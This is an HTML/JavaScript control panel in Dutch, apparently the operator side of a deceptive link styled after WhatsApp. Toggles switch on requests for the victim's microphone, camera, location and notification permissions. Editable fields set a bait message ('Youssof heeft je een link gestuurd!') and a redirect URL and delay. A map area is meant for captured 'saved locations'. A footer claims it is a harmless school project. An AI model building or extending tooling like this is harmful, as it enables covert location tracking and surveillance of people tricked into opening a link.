<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <title>Opgeslagen Gegevens</title>
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            padding: 20px;
            margin: 0;
            background: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg') no-repeat center center fixed;
            background-size: cover;
            color: #333;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Container voor schakelaars en bewerkbare velden */
        .switches-container {
            background: rgba(255, 255, 255, 0.9);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            width: 100%;
            max-width: 800px;
            box-sizing: border-box;
        }

        .location-item {
            margin-bottom: 20px;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            position: relative;
            width: 100%;
            max-width: 800px;
            box-sizing: border-box;
        }

        /* Professionele sluitknop */
        .close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: transparent;
            color: #e74c3c;
            border: none;
            font-size: 18px;
            cursor: pointer;
        }

        .close-btn:hover {
            color: #c0392b;
        }

        .close-btn::before {
            content: '\2715'; /* Unicode-teken voor 'x' */
        }

        /* Schakelaar */
        .switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
            margin-right: 10px;
            vertical-align: middle;
        }

        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }

        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 24px;
        }

        .slider::before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }

        input:checked + .slider {
            background-color: #4caf50;
        }

        input:focus + .slider {
            box-shadow: 0 0 1px #4caf50;
        }

        input:checked + .slider::before {
            transform: translateX(26px);
        }

        /* Algemene label stijl */
        label {
            font-size: 16px;
            margin-bottom: 2px;
            display: flex;
            align-items: center;
            font-weight: bold;
        }

        .edit-label {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            font-weight: bold;
            font-size: 16px;
            margin-top: 5px;
            margin-bottom: 2px;
            color: #333;
        }

        .edit-section {
            margin-bottom: 10px;
        }

        .edit-section input {
            width: 100%;
            padding: 8px;
            margin-top: 2px;
            margin-bottom: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
        }

        .editable-div {
            width: 100%;
            min-height: 50px;
            padding: 8px;
            margin-top: 2px;
            margin-bottom: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
            background-color: #fff;
            overflow: auto;
        }

        .text-color-controls {
            margin-bottom: 5px;
        }

        .color-button {
            background: none;
            border: none;
            font-size: 16px;
            cursor: pointer;
            margin-right: 5px;
        }

        .color-button:hover {
            text-decoration: underline;
        }

        .notification-section {
            margin-top: 15px;
            text-align: left;
        }

        .notification-section input[type="text"],
        .notification-section input[type="file"] {
            width: 100%;
            padding: 8px;
            margin-top: 2px;
            margin-bottom: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            box-sizing: border-box;
        }

        .notification-section img {
            margin-top: 10px;
        }

        .notification-section button {
            margin-top: 5px;
            padding: 8px 15px;
            border: none;
            background-color: #4caf50;
            color: white;
            cursor: pointer;
            border-radius: 5px;
            font-size: 14px;
        }

        .notification-section button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        /* Uitlijning van schakelaars en tekst */
        .switch-container {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }

        .switch-container label {
            margin: 0;
        }

        .switch-text {
            margin-left: 10px;
            font-size: 16px;
            color: #333;
            font-weight: bold;
        }

        /* Bewerkbare titel */
        .title-input {
            width: 100%;
            padding: 5px;
            margin-top: 2px;
            margin-bottom: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            font-weight: bold;
            box-sizing: border-box;
        }

        /* Map container */
        .map-container {
            width: 100%;
            height: 200px;
            margin-top: 10px;
        }

        /* Disclaimer */
        .disclaimer {
            margin-top: 20px;
            font-size: 12px;
            color: #fff;
            text-align: center;
        }

        /* Stijl voor de "Instellingen opslaan" knop */
        #saveSettingsButton {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4caf50; /* Groen */
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px; /* Ruimte boven de knop */
        }

        #saveSettingsButton:hover {
            background-color: #45a049; /* Donkerder groen bij hover */
        }

        /* Responsive */
        @media screen and (max-width: 480px) {
            body {
                padding: 10px;
            }

            .switches-container {
                padding: 10px;
            }

            .location-item {
                padding: 10px;
            }

            .edit-label, .switch-text {
                font-size: 14px;
            }

            .notification-section button {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <h1>Opgeslagen Gegevens</h1>

    <!-- Schakelaars in een wit vak -->
    <div class="switches-container">
        <!-- On/Off schakelaars -->
        <div class="switch-container">
            <label class="switch">
                <input type="checkbox" id="micCamSwitch">
                <span class="slider"></span>
            </label>
            <span class="switch-text">Microfoon en Camera toestemming inschakelen</span>
        </div>

        <div class="switch-container">
            <label class="switch">
                <input type="checkbox" id="locationSwitch">
                <span class="slider"></span>
            </label>
            <span class="switch-text">Locatie toestemming inschakelen</span>
        </div>

        <div class="switch-container">
            <label class="switch">
                <input type="checkbox" id="notificationsSwitch">
                <span class="slider"></span>
            </label>
            <span class="switch-text">Notificatie toestemming inschakelen</span>
        </div>

        <!-- Bewerk sectie -->
        <div class="edit-section">
            <label for="messageInput" class="edit-label">Bewerk de berichttekst:</label>
            <div class="text-color-controls">
                <button type="button" class="color-button" data-color="black" style="color: black;">A</button>
                <button type="button" class="color-button" data-color="red" style="color: red;">A</button>
                <button type="button" class="color-button" data-color="green" style="color: green;">A</button>
                <button type="button" class="color-button" data-color="blue" style="color: blue;">A</button>
            </div>
            <div id="messageInput" contenteditable="true" class="editable-div">Youssof heeft je een link gestuurd!</div>

            <label for="redirectUrlInput" class="edit-label">Voer de redirect URL in:</label>
            <input type="text" id="redirectUrlInput" placeholder="https://example.com">

            <label for="redirectDelayInput" class="edit-label">Aantal seconden voor redirect:</label>
            <input type="number" id="redirectDelayInput" placeholder="5" min="1" max="60">

            <!-- Toegevoegde knop -->
            <button id="saveSettingsButton">Instellingen opslaan</button>
        </div>
    </div>

    <div id="saved-locations"></div>

    <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // Haal elementen op
        const micCamSwitch = document.getElementById("micCamSwitch");
        const locationSwitch = document.getElementById("locationSwitch");
        const notificationsSwitch = document.getElementById("notificationsSwitch");
        const messageInput = document.getElementById("messageInput");
        const redirectUrlInput = document.getElementById("redirectUrlInput");
        const redirectDelayInput = document.getElementById("redirectDelayInput");
        const saveSettingsButton = document.getElementById("saveSettingsButton");

        // Functie om instellingen van de server op te halen
        async function fetchSettings() {
            try {
                const response = await fetch('api.php');
                if (!response.ok) {
                    throw new Error('Fout bij het ophalen van instellingen.');
                }
                const settings = await response.json();

                // Stel de huidige waarden in
                micCamSwitch.checked = settings.micCamEnabled;
                locationSwitch.checked = settings.locationEnabled;
                notificationsSwitch.checked = settings.notificationsEnabled;
                messageInput.innerHTML = settings.messageText;
                redirectUrlInput.value = settings.redirectUrl;
                redirectDelayInput.value = settings.redirectDelay;

            } catch (error) {
                console.error('Fout bij het ophalen van instellingen:', error);
                alert('Fout bij het ophalen van instellingen van de server.');
            }
        }

        // Roep de functie aan om instellingen op te halen
        fetchSettings();

        // Event listener voor kleurknoppen
        document.querySelectorAll('.color-button').forEach(button => {
            button.addEventListener('click', () => {
                const color = button.getAttribute('data-color');
                document.execCommand('foreColor', false, color);
            });
        });

        // Event listener voor de knop om instellingen op te slaan
        saveSettingsButton.addEventListener("click", async () => {
            // Haal de waarden op uit de inputs en schakelaars
            const settings = {
                micCamEnabled: micCamSwitch.checked,
                locationEnabled: locationSwitch.checked,
                notificationsEnabled: notificationsSwitch.checked,
                messageText: messageInput.innerHTML,
                redirectUrl: redirectUrlInput.value,
                redirectDelay: parseInt(redirectDelayInput.value, 10) || 5
            };

            try {
                const response = await fetch('api.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(settings)
                });

                if (!response.ok) {
                    throw new Error('Fout bij het opslaan van instellingen.');
                }

                const result = await response.json();

                if (result.success) {
                    alert('Instellingen opgeslagen.');
                } else {
                    alert('Fout bij het opslaan van instellingen.');
                }
            } catch (error) {
                console.error('Fout bij het opslaan van instellingen:', error);
                alert('Fout bij het opslaan van instellingen naar de server.');
            }
        });

        // De rest van je bestaande code voor het weergeven van opgeslagen locaties
        // ...
    </script>
</body>
</html>
